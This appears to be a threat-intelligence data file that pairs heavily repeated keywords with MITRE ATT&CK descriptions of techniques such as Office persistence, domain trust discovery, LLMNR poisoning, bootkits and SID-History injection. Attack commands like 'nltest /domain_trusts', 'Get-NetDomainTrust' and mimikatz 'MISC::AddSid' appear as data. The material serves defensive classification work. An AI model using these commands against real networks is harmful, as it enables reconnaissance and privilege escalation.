HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
HKCU\Software\Microsoft\Office test\Special\Perf 
Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)
In order to evade network level detection, the downloader uses steganography.
Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. 
The wormDll32 module attempts to identify servers and domain controllers in the network using NetServerEnum and LDAP queries.
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
objectClass=trustedDomain 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 nltest /domain_trusts 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetDomainTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
 Get-NetForestTrust 
Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)
This module searches the infected system’s files to gather email addresses for information-stealing purposes.
Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients. 
send a POST response to the C&C server to extract the user’s login credentials. redirect users to fake phishing websites.
Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)

A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.

Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)
A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file.
Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. 

Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
bootkit
Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
UserInitMprLogonScript
Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  

Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. 

An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
load additional modules
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
NTDLL.dll 
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 LoadLibraryExW()
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
 DWriteCreateFactory() 
Adversaries may execute malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API.(Citation: Wikipedia Windows Library Files)

The module loader can load DLLs:

* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
    
* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
    
* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
    
* via <code>&#x3c;file name="filename.extension" loadFrom="fully-qualified or relative pathname"&#x3e;</code> in an embedded or external "application manifest". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.

Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, malware may execute share modules to load additional components or features.
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
Inveigh 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 NBNS Spoofing 
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
 poison name services
By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. 

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)

Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.

In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. 

Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
VPN and to persist in same sentence 
Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Tor plugin 
Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, "domainless" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).

For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
SID-History 
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
 MISC::AddSid
Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
ChangeServiceConfigW 
